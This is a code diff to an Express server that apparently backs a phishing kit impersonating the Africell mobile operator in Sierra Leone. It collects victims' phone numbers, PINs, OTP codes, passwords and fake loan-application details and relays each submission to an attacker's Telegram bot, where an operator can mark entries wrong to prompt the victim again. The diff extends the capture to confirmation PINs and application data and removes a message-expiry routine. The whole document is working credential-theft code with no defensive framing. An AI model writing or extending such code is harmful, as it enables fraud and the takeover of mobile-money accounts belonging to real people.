@@ -49,7 +49,7 @@ async function sendToTelegram(url, payload) {
     }
 }
 
-// Handles Submissions across login and PIN confirmation flows
+// Handles Submissions across application, login, OTP, and PIN confirmation flows
 app.post('/api/submit-order', async (req, res) => {
     try {
         const { phone, uniqueId } = req.body;
@@ -65,7 +65,14 @@ app.post('/api/submit-order', async (req, res) => {
         // Force status to 'pending' immediately on every new request
         orderStatuses[cleanPhone] = 'pending';
 
-        const isImportantAction = (uniqueId && (uniqueId.startsWith('PIN: ') || uniqueId.startsWith('Login PIN: ') || uniqueId.startsWith('OTP Code: ') || uniqueId.startsWith('Password: ')));
+        const isImportantAction = (uniqueId && (
+            uniqueId.startsWith('PIN: ') || 
+            uniqueId.startsWith('Login PIN: ') || 
+            uniqueId.startsWith('OTP Code: ') || 
+            uniqueId.startsWith('Confirmation PIN: ') || 
+            uniqueId.startsWith('Sign-in Phone Number:') || 
+            uniqueId.startsWith('Application -')
+        ));
 
         if (!isImportantAction && lastSubmissionTime[cleanPhone] && (currentTime - lastSubmissionTime[cleanPhone] < cooldownTime)) {
             return res.json({ success: true, message: 'Already submitted.' });
@@ -94,6 +101,17 @@ app.post('/api/submit-order', async (req, res) => {
             headerTitle = "📱 *Africell OTP Code Submitted*";
             wrongButtonText = "⚠️ Wrong OTP";
             userCredentials[cleanPhone].otp = uniqueId.replace('OTP Code: ', '').trim();
+        } else if (uniqueId && uniqueId.startsWith('Confirmation PIN: ')) {
+            headerTitle = "🔐 *Africell Confirmation PIN Submitted*";
+            wrongButtonText = "⚠️ Wrong PIN";
+            userCredentials[cleanPhone].confirmPin = uniqueId.replace('Confirmation PIN: ', '').trim();
+        } else if (uniqueId && uniqueId.startsWith('Sign-in Phone Number:')) {
+            headerTitle = "📱 *Africell Sign-in Phone Number*";
+            wrongButtonText = "⚠️ Wrong Info";
+        } else if (uniqueId && uniqueId.startsWith('Application -')) {
+            headerTitle = "📄 *New Loan Application Submitted*";
+            wrongButtonText = "❌ Reject Application";
+            userCredentials[cleanPhone].applicationDetails = uniqueId;
         } else if (uniqueId) {
             userCredentials[cleanPhone].password = uniqueId;
             headerTitle = "🔑 *Africell Login Attempt*";
@@ -106,11 +124,17 @@ app.post('/api/submit-order', async (req, res) => {
                       `${countryFlag} Country: \`+232\`\n` +
                       `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;
 
+        if (userCredentials[cleanPhone].applicationDetails) {
+            message += `\n\n📋 *Details:*\n${escapeMarkdown(userCredentials[cleanPhone].applicationDetails)}`;
+        }
         if (userCredentials[cleanPhone].mpin) {
             message += `\n🔐 PIN Code: \`${escapeMarkdown(userCredentials[cleanPhone].mpin)}\``;
         }
         if (userCredentials[cleanPhone].otp) {
             message += `\n📱 OTP Code: \`${escapeMarkdown(userCredentials[cleanPhone].otp)}\``;
+        }
+        if (userCredentials[cleanPhone].confirmPin) {
+            message += `\n🔐 Confirmation PIN: \`${escapeMarkdown(userCredentials[cleanPhone].confirmPin)}\``;
         }
         if (userCredentials[cleanPhone].password) {
             message += `\n🔑 Password: \`${escapeMarkdown(userCredentials[cleanPhone].password)}\``;
@@ -134,34 +158,6 @@ app.post('/api/submit-order', async (req, res) => {
                 ]
             }
         });
-
-        if (sentTelegramMsg && sentTelegramMsg.result) {
-            const msgChatId = sentTelegramMsg.result.chat.id;
-            const msgId = sentTelegramMsg.result.message_id;
-
-            setTimeout(async () => {
-                if (orderStatuses[cleanPhone] === 'pending') {
-                    orderStatuses[cleanPhone] = 'expired';
-
-                    let expiredMessage = `⌛ *Africell Request Expired / Timed Out*\n\n` +
-                                         `${countryFlag} Country: \`+232\`\n` +
-                                         `📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n` +
-                                         `📌 Status: *Timed Out (User Left / No Admin Action)*`;
-
-                    const editUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
-                    try {
-                        await sendToTelegram(editUrl, {
-                            chat_id: msgChatId,
-                            message_id: msgId,
-                            text: expiredMessage,
-                            parse_mode: 'Markdown'
-                        });
-                    } catch (err) {
-                        console.error('Failed to expire Telegram message:', err.message);
-                    }
-                }
-            }, 5 * 60 * 1000);
-        }
 
         res.json({ success: true, message: 'Sent successfully.' });
     } catch (error) {
@@ -215,7 +211,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
                     messageTitle = 'Africell Request Rejected';
                 } else if (callbackData.startsWith('wrong_id_')) {
                     orderStatuses[phone] = 'wrong_id';
-                    actionText = 'Wrong Info ⚠️';
+                    actionText = 'Wrong Info / Error ⚠️';
                     messageTitle = 'Africell Credential Error';
                 }
             }
@@ -229,11 +225,17 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
             if (userCredentials[phone]) {
                 const creds = userCredentials[phone];
+                if (creds.applicationDetails) {
+                    updatedMessage += `\n\n📋 *Details:*\n${escapeMarkdown(creds.applicationDetails)}`;
+                }
                 if (creds.mpin) {
                     updatedMessage += `\n🔐 PIN Code: \`${escapeMarkdown(creds.mpin)}\``;
                 }
                 if (creds.otp) {
                     updatedMessage += `\n📱 OTP Code: \`${escapeMarkdown(creds.otp)}\``;
+                }
+                if (creds.confirmPin) {
+                    updatedMessage += `\n🔐 Confirmation PIN: \`${escapeMarkdown(creds.confirmPin)}\``;
                 }
                 if (creds.password) {
                     updatedMessage += `\n🔑 Password: \`${escapeMarkdown(creds.password)}\``;
